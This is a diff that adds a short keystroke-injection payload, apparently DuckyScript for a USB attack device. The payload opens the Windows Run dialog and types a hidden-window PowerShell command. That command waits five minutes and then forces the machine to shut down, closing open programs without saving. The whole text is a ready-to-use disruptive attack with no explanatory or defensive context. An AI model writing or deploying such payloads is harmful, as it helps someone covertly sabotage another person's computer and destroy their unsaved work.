@@ -1,0 +1,5 @@
+GUI r
+DELAY 250
+STRING powershell -WindowStyle Hidden -Command timeout 300; shutdown /s /f /t 0
+DELAY 150
+ENTER
